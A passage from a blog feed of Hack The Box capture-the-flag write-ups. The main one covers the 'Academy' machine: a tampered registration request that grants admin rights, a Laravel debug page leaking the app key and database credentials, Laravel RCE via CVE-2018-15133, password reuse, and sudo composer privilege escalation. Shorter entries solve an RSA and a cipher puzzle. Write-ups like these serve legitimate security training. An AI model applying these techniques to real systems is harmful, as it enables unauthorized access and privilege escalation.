SF-Port33060-TCP:V&#x3D;7.91%I&#x3D;7%D&#x3D;12&#x2F;10%Time&#x3D;5FD1EA61%P&#x3D;x86_64-pc-linux-gnu%r(</span><br><span class="line">[*] Nmap: SF:NULL,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(GenericLines,9,&quot;\x05\0\0\0\x0b</span><br><span class="line">[*] Nmap: SF:\x08\x05\x1a\0&quot;)%r(GetRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(HTTPO</span><br><span class="line">[*] Nmap: SF:ptions,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(RTSPRequest,9,&quot;\x05\0\0\0\x0</span><br><span class="line">[*] Nmap: SF:b\x08\x05\x1a\0&quot;)%r(RPCCheck,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(DNSVer</span><br><span class="line">[*] Nmap: SF:sionBindReqTCP,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(DNSStatusRequestTCP,</span><br><span class="line">[*] Nmap: SF:2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0f</span><br><span class="line">[*] Nmap: SF:Invalid\x20message\&quot;\x05HY000&quot;)%r(Help,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;</span><br><span class="line">[*] Nmap: SF:)%r(SSLSessionReq,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x0</span><br><span class="line">[*] Nmap: SF:1\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(TerminalServerCooki</span><br><span class="line">[*] Nmap: SF:e,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(TLSSessionReq,2B,&quot;\x05\0\0\0\x0b\</span><br><span class="line">[*] Nmap: SF:x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\</span><br><span class="line">[*] Nmap: SF:&quot;\x05HY000&quot;)%r(Kerberos,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SMBProgNeg,</span><br><span class="line">[*] Nmap: SF:9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(X11Probe,2B,&quot;\x05\0\0\0\x0b\x08\x05</span><br><span class="line">[*] Nmap: SF:\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\x05HY</span><br><span class="line">[*] Nmap: SF:000&quot;)%r(FourOhFourRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LPDString</span><br><span class="line">[*] Nmap: SF:,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LDAPSearchReq,2B,&quot;\x05\0\0\0\x0b\x</span><br><span class="line">[*] Nmap: SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;</span><br><span class="line">[*] Nmap: SF:\x05HY000&quot;)%r(LDAPBindReq,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SIPOption</span><br><span class="line">[*] Nmap: SF:s,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LANDesk-RC,9,&quot;\x05\0\0\0\x0b\x08\</span><br><span class="line">[*] Nmap: SF:x05\x1a\0&quot;)%r(TerminalServer,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(NCP,9,</span><br><span class="line">[*] Nmap: SF:&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(NotesRPC,2B,&quot;\x05\0\0\0\x0b\x08\x05\x</span><br><span class="line">[*] Nmap: SF:1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\x05HY00</span><br><span class="line">[*] Nmap: SF:0&quot;)%r(JavaRMI,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(WMSRequest,9,&quot;\x05\0\</span><br><span class="line">[*] Nmap: SF:0\0\x0b\x08\x05\x1a\0&quot;)%r(oracle-tns,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%</span><br><span class="line">[*] Nmap: SF:r(ms-sql-s,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(afp,2B,&quot;\x05\0\0\0\x0b\x</span><br><span class="line">[*] Nmap: SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;</span><br><span class="line">[*] Nmap: SF:\x05HY000&quot;)%r(giop,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Ports 20, 80 running there usual services .Have an unusual port 33060 for which nmap couldnt do the service detection . Will start with the port 80 . check whats on the UI </p><p><img src="/images/academy2.png" alt="academy ui"></p><p>its a php web application based around learning thus the name Academy . these names are always very touche . Ran a nikto vulnerability scanner to find more about the website </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+ Server: Apache&#x2F;2.4.41 (Ubuntu)                                                                                                                                                             </span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.                                                                                                                               </span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS                                                                    </span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type                                    </span><br><span class="line">+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)                                                                                                                   </span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.                                                                                                </span><br><span class="line">+ Cookie PHPSESSID created without the httponly flag                                                                                                                                         </span><br><span class="line">+ &#x2F;config.php: PHP Config file may contain database IDs and passwords.                                                                                                                       </span><br><span class="line">+ OSVDB-29786: &#x2F;admin.php?en_log_id&#x3D;0&amp;action&#x3D;config: EasyNews from http:&#x2F;&#x2F;www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.                            </span><br><span class="line">+ OSVDB-29786: &#x2F;admin.php?en_log_id&#x3D;0&amp;action&#x3D;users: EasyNews from http:&#x2F;&#x2F;www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.                             </span><br><span class="line">+ OSVDB-3092: &#x2F;admin.php: This might be interesting...                                                                                                                                       </span><br><span class="line">+ &#x2F;login.php: Admin login page&#x2F;section found.</span><br><span class="line">+ 7786 requests: 0 error(s) and 10 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-12-10 15:26:54 (GMT5.5) (442 seconds)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>NIkto discovered privileged pages on the web application . To find how the application is differentiating between privileged and unpriviliged users need a web proxy here to intercept packets going through the app .</p><p>Upon analysing the packets saw an interesting field called called <em>roleid</em> while doing the register call for the new user . Just changed that from 0 to 1 . As a result the user that was created was an admin user . Now can access privileged pages </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;register.php HTTP&#x2F;1.1</span><br><span class="line">Host: academy.htb</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:78.0) Gecko&#x2F;20100101 Firefox&#x2F;78.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 67</span><br><span class="line">Origin: http:&#x2F;&#x2F;academy.htb</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;academy.htb&#x2F;register.php</span><br><span class="line">Cookie: PHPSESSID&#x3D;s6k227pb24kmst4cc0v2o5bgj8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">uid&#x3D;dmeg1&amp;password&#x3D;KYnCMT9ZiMFzncR&amp;confirm&#x3D;KYnCMT9ZiMFzncR&amp;roleid&#x3D;1</span><br></pre></td></tr></table></figure><p>after logging into the /admin.php can see this page</p><p><img src="/images/academy3.png" alt="acadmy-admin"></p><p>this page tells there is a <em>dev-staging</em> page and has an outstanding issue in it . will add this in the hostfile and try opening this page to see how looks.</p><p><img src="/images/academy4.png" alt="dev-staging"></p><p>Due to a file permission issue laravel is able not open the log file to write and crashing. This is throwing a stak with a dump of all environment variables used in the application . its a treasure trove . will copy everything and see what can be used to exploit </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line">HTTP_HOST</span><br><span class="line">&quot;dev-staging-01.academy.htb&quot;</span><br><span class="line">HTTP_CONNECTION</span><br><span class="line">&quot;keep-alive&quot;</span><br><span class="line">HTTP_UPGRADE_INSECURE_REQUESTS</span><br><span class="line">&quot;1&quot;</span><br><span class="line">HTTP_USER_AGENT</span><br><span class="line">&quot;Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.66 Safari&#x2F;537.36&quot;</span><br><span class="line">HTTP_ACCEPT</span><br><span class="line">&quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9&quot;</span><br><span class="line">HTTP_ACCEPT_ENCODING</span><br><span class="line">&quot;gzip, deflate&quot;</span><br><span class="line">HTTP_ACCEPT_LANGUAGE</span><br><span class="line">&quot;en-IN,en-US;q&#x3D;0.9,en;q&#x3D;0.8&quot;</span><br><span class="line">PATH</span><br><span class="line">&quot;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;snap&#x2F;bin&quot;</span><br><span class="line">SERVER_SIGNATURE</span><br><span class="line">&quot;&lt;address&gt;Apache&#x2F;2.4.41 (Ubuntu) Server at dev-staging-01.academy.htb Port 80&lt;&#x2F;address&gt;&quot;</span><br><span class="line">SERVER_SOFTWARE</span><br><span class="line">&quot;Apache&#x2F;2.4.41 (Ubuntu)&quot;</span><br><span class="line">SERVER_NAME</span><br><span class="line">&quot;dev-staging-01.academy.htb&quot;</span><br><span class="line">SERVER_ADDR</span><br><span class="line">&quot;10.10.10.215&quot;</span><br><span class="line">SERVER_PORT</span><br><span class="line">&quot;80&quot;</span><br><span class="line">REMOTE_ADDR</span><br><span class="line">&quot;10.10.14.4&quot;</span><br><span class="line">DOCUMENT_ROOT</span><br><span class="line">&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;htb-academy-dev-01&#x2F;public&quot;</span><br><span class="line">REQUEST_SCHEME</span><br><span class="line">&quot;http&quot;</span><br><span class="line">CONTEXT_PREFIX</span><br><span class="line">&quot;&quot;</span><br><span class="line">CONTEXT_DOCUMENT_ROOT</span><br><span class="line">&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;htb-academy-dev-01&#x2F;public&quot;</span><br><span class="line">SERVER_ADMIN</span><br><span class="line">&quot;admin@htb&quot;</span><br><span class="line">SCRIPT_FILENAME</span><br><span class="line">&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;htb-academy-dev-01&#x2F;public&#x2F;index.php&quot;</span><br><span class="line">REMOTE_PORT</span><br><span class="line">&quot;33984&quot;</span><br><span class="line">GATEWAY_INTERFACE</span><br><span class="line">&quot;CGI&#x2F;1.1&quot;</span><br><span class="line">SERVER_PROTOCOL</span><br><span class="line">&quot;HTTP&#x2F;1.1&quot;</span><br><span class="line">REQUEST_METHOD</span><br><span class="line">&quot;GET&quot;</span><br><span class="line">QUERY_STRING</span><br><span class="line">&quot;&quot;</span><br><span class="line">REQUEST_URI</span><br><span class="line">&quot;&#x2F;&quot;</span><br><span class="line">SCRIPT_NAME</span><br><span class="line">&quot;&#x2F;index.php&quot;</span><br><span class="line">PHP_SELF</span><br><span class="line">&quot;&#x2F;index.php&quot;</span><br><span class="line">REQUEST_TIME_FLOAT</span><br><span class="line">1607595624.028</span><br><span class="line">REQUEST_TIME</span><br><span class="line">1607595624</span><br><span class="line">APP_NAME</span><br><span class="line">&quot;Laravel&quot;</span><br><span class="line">APP_ENV</span><br><span class="line">&quot;local&quot;</span><br><span class="line">APP_KEY</span><br><span class="line">&quot;base64:dBLUaMuZz7Iq06XtL&#x2F;Xnz&#x2F;90Ejq+DEEynggqubHWFj0&#x3D;&quot;</span><br><span class="line">APP_DEBUG</span><br><span class="line">&quot;true&quot;</span><br><span class="line">APP_URL</span><br><span class="line">&quot;http:&#x2F;&#x2F;localhost&quot;</span><br><span class="line">LOG_CHANNEL</span><br><span class="line">&quot;stack&quot;</span><br><span class="line">DB_CONNECTION</span><br><span class="line">&quot;mysql&quot;</span><br><span class="line">DB_HOST</span><br><span class="line">&quot;127.0.0.1&quot;</span><br><span class="line">DB_PORT</span><br><span class="line">&quot;3306&quot;</span><br><span class="line">DB_DATABASE</span><br><span class="line">&quot;homestead&quot;</span><br><span class="line">DB_USERNAME</span><br><span class="line">&quot;homestead&quot;</span><br><span class="line">DB_PASSWORD</span><br><span class="line">&quot;secret&quot;</span><br><span class="line">BROADCAST_DRIVER</span><br><span class="line">&quot;log&quot;</span><br><span class="line">CACHE_DRIVER</span><br><span class="line">&quot;file&quot;</span><br><span class="line">SESSION_DRIVER</span><br><span class="line">&quot;file&quot;</span><br><span class="line">SESSION_LIFETIME</span><br><span class="line">&quot;120&quot;</span><br><span class="line">QUEUE_DRIVER</span><br><span class="line">&quot;sync&quot;</span><br><span class="line">REDIS_HOST</span><br><span class="line">&quot;127.0.0.1&quot;</span><br><span class="line">REDIS_PASSWORD</span><br><span class="line">&quot;null&quot;</span><br><span class="line">REDIS_PORT</span><br><span class="line">&quot;6379&quot;</span><br><span class="line">MAIL_DRIVER</span><br><span class="line">&quot;smtp&quot;</span><br><span class="line">MAIL_HOST</span><br><span class="line">&quot;smtp.mailtrap.io&quot;</span><br><span class="line">MAIL_PORT</span><br><span class="line">&quot;2525&quot;</span><br><span class="line">MAIL_USERNAME</span><br><span class="line">&quot;null&quot;</span><br><span class="line">MAIL_PASSWORD</span><br><span class="line">&quot;null&quot;</span><br><span class="line">MAIL_ENCRYPTION</span><br><span class="line">&quot;null&quot;</span><br><span class="line">PUSHER_APP_ID</span><br><span class="line">&quot;&quot;</span><br><span class="line">PUSHER_APP_KEY</span><br><span class="line">&quot;&quot;</span><br><span class="line">PUSHER_APP_SECRET</span><br><span class="line">&quot;&quot;</span><br><span class="line">PUSHER_APP_CLUSTER</span><br><span class="line">&quot;mt1&quot;</span><br><span class="line">MIX_PUSHER_APP_KEY</span><br><span class="line">&quot;&quot;</span><br><span class="line">MIX_PUSHER_APP_CLUSTER</span><br><span class="line">&quot;mt1&quot;</span><br><span class="line">Environment Variables</span><br><span class="line">APP_NAME</span><br><span class="line">&quot;Laravel&quot;</span><br><span class="line">APP_ENV</span><br><span class="line">&quot;local&quot;</span><br><span class="line">APP_KEY</span><br><span class="line">&quot;base64:dBLUaMuZz7Iq06XtL&#x2F;Xnz&#x2F;90Ejq+DEEynggqubHWFj0&#x3D;&quot;</span><br><span class="line">APP_DEBUG</span><br><span class="line">&quot;true&quot;</span><br><span class="line">APP_URL</span><br><span class="line">&quot;http:&#x2F;&#x2F;localhost&quot;</span><br><span class="line">LOG_CHANNEL</span><br><span class="line">&quot;stack&quot;</span><br><span class="line">DB_CONNECTION</span><br><span class="line">&quot;mysql&quot;</span><br><span class="line">DB_HOST</span><br><span class="line">&quot;127.0.0.1&quot;</span><br><span class="line">DB_PORT</span><br><span class="line">&quot;3306&quot;</span><br><span class="line">DB_DATABASE</span><br><span class="line">&quot;homestead&quot;</span><br><span class="line">DB_USERNAME</span><br><span class="line">&quot;homestead&quot;</span><br><span class="line">DB_PASSWORD</span><br><span class="line">&quot;secret&quot;</span><br><span class="line">BROADCAST_DRIVER</span><br><span class="line">&quot;log&quot;</span><br><span class="line">CACHE_DRIVER</span><br><span class="line">&quot;file&quot;</span><br><span class="line">SESSION_DRIVER</span><br><span class="line">&quot;file&quot;</span><br><span class="line">SESSION_LIFETIME</span><br><span class="line">&quot;120&quot;</span><br><span class="line">QUEUE_DRIVER</span><br><span class="line">&quot;sync&quot;</span><br><span class="line">REDIS_HOST</span><br><span class="line">&quot;127.0.0.1&quot;</span><br><span class="line">REDIS_PASSWORD</span><br><span class="line">&quot;null&quot;</span><br><span class="line">REDIS_PORT</span><br><span class="line">&quot;6379&quot;</span><br><span class="line">MAIL_DRIVER</span><br><span class="line">&quot;smtp&quot;</span><br><span class="line">MAIL_HOST</span><br><span class="line">&quot;smtp.mailtrap.io&quot;</span><br><span class="line">MAIL_PORT</span><br><span class="line">&quot;2525&quot;</span><br><span class="line">MAIL_USERNAME</span><br><span class="line">&quot;null&quot;</span><br><span class="line">MAIL_PASSWORD</span><br><span class="line">&quot;null&quot;</span><br><span class="line">MAIL_ENCRYPTION</span><br><span class="line">&quot;null&quot;</span><br><span class="line">PUSHER_APP_ID</span><br><span class="line">&quot;&quot;</span><br><span class="line">PUSHER_APP_KEY</span><br><span class="line">&quot;&quot;</span><br><span class="line">PUSHER_APP_SECRET</span><br><span class="line">&quot;&quot;</span><br><span class="line">PUSHER_APP_CLUSTER</span><br><span class="line">&quot;mt1&quot;</span><br><span class="line">MIX_PUSHER_APP_KEY</span><br><span class="line">&quot;&quot;</span><br><span class="line">MIX_PUSHER_APP_CLUSTER</span><br><span class="line">&quot;mt1&quot;</span><br><span class="line">Registered Handlers</span><br><span class="line">0. Whoops\Handler\PrettyPageHandler</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>taking out important shit from the dump.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SERVER_ADMIN</span><br><span class="line">&quot;admin@htb&quot;</span><br><span class="line">SCRIPT_FILENAME</span><br><span class="line">&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;htb-academy-dev-01&#x2F;public&#x2F;index.php&quot;</span><br><span class="line">REMOTE_PORT</span><br><span class="line">&quot;33984&quot;</span><br><span class="line">GATEWAY_INTERFACE</span><br><span class="line">&quot;CGI&#x2F;1.1</span><br><span class="line">APP_KEY</span><br></pre></td></tr></table></figure><p>probably the cgi server itself is running on 33984 . couldnt directly reach from browser. said connection refused . could probably use from proxying through like the web server .</p><p>since the app key is there will use <a href="https://www.exploit-db.com/exploits/47129">CVE-2018-15133</a> exploit with metasploit to get a shell. </p><blockquote><p>In Laravel Framework through 5.5.40 and 5.6.x through 5.6.29, remote code execution might occur as a result of an unserialize call on a potentially untrusted X-XSRF-TOKEN value. This involves the decrypt method in Illuminate/Encryption/Encrypter.php and PendingBroadcast in gadgetchains/Laravel/RCE/3/chain.php in phpggc. The attacker must know the application key, which normally would never occur, but could happen if the attacker previously had privileged access or successfully accomplished a previous attack.</p></blockquote><p>which this case , we have .</p><p><img src="/images/academy5.png" alt="user-1"></p><p>got in as www-data now have to do privilege escalation</p><p>in the /var/www/html/academy folder got the laravel dir. .env has all the environment variables. got db password here . since the planner told us cry0l1t3 wrote the modules he probably used the same password for his account as the db pass<br>and boom am in<br><img src="/images/academy6.png" alt="user-2"><br>have to do privilege escalation<br>since the user doesnt have sudoers permission it says the command will be logged .<br><img src="/images/academy7.png" alt="command"></p><p>its logged in /var/log/auth/<br>checked for any command with su in the file and extracted the data<br><img src="/images/academy8.png" alt="data"><br>converted the hex key to string and got password for mrb3n</p><p><img src="/images/academy9.png" alt="user-3"></p><p>from here used the <a href="https://gtfobins.github.io/gtfobins/composer/">gtfobins composer</a> to do privilege escalation as this user had access to run composer as a sudo .<br>got the root flag</p><p><img src="/images/academy10.png" alt="root"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weak RSA</title>
      <link href="2020/12/12/Weak%20RSA/"/>
      <url>2020/12/12/Weak%20RSA/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/weak1.png" alt="weak rsa"><br>This challenge provides the encrypted ciphertext and public key with a weak factor . The goal is to get the flag in the message .</p><a id="more"></a><p><a href="https://justrocketscience.com/post/crack-unsafe-rsa-encryption/">this is a quick and concise information about the weakness</a></p><p>can derive from the reading that if the p and q values are smaller primes, can break the RSA algorithm! Which should be what we need to do here </p><p>Ganapati has made this <a href="https://github.com/Ganapati/RsaCtfTool">awesome RSA multi attacks tool</a> that checks for all possible vulnerabilities in the public key and even does the attacks . like in my case i gave it the public key and ciphertext and it gave me the flag .</p><p><img src="/images/weak2.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> CTF </tag>
            
            <tag> CRYPTO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Templed</title>
      <link href="2020/12/12/Templed/"/>
      <url>2020/12/12/Templed/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/templed1.png" alt="Templed"></p><p>The zip file is unlocked by the password <code>hackthebox</code>,  as ridiculous as it is .<br>anyways we move on and inside of the folder we get a Scroll.png of type <code>Scroll.png: PNG image data, 580 x 78, 8-bit/color RGBA, non-interlaced</code> .</p><a id="more"></a><p> <img src="/images/templed2.png" alt="cipher"></p><p>This is how our cipher looks like . upon further checking it is revealed that this is cypher of the monks and all these symbols stand for numbers . TIL do all kind of search possible , even image search . </p><p><img src="/images/templed3.png" alt="meaning of symbols"></p><p>we cab get numbers out of this </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">60 + 6 &#x3D; 66</span><br><span class="line"></span><br><span class="line">100 + 3 + 20 &#x3D; 123</span><br><span class="line"></span><br><span class="line">70 + 7 &#x3D; 77</span><br><span class="line"></span><br><span class="line">40 + 8 &#x3D; 48</span><br><span class="line"></span><br><span class="line">70 + 8 &#x3D; 78</span><br><span class="line"></span><br><span class="line">7 + 100 &#x3D; 107</span><br><span class="line"></span><br><span class="line">5 + 10 + 100 &#x3D; 115</span><br><span class="line"></span><br><span class="line">90 + 5 &#x3D; 95</span><br><span class="line"></span><br><span class="line">100 + 7 &#x3D; 107</span><br><span class="line"></span><br><span class="line">70 + 8 &#x3D; 78</span><br><span class="line"></span><br><span class="line">50 + 1 &#x3D; 51</span><br><span class="line"></span><br><span class="line">10 + 9 + 100 &#x3D; 119</span><br><span class="line"></span><br><span class="line">30 + 3 &#x3D; 33</span><br><span class="line"></span><br><span class="line">5 + 20 + 100 &#x3D; 125</span><br><span class="line"></span><br><span class="line">&#x3D; 72 84 66 123 77 48 78 107 115 95 107 78 51 119 33 125</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>This looks like ASCII . so lets put it in an online converter .</p><p><img src="/images/templed4.png" alt="flag"></p><p>thats it . this gives the flag</p><p>HTB{M0Nks_kN3w!}</p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> CTF </tag>
            
            <tag> OSINT </tag>
            
            <tag> CRYPTO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Money Flowz</title>
      <link href="2020/12/12/Money%20Flowz/"/>
      <url>2020/12/12/Money%20Flowz/</url>
      
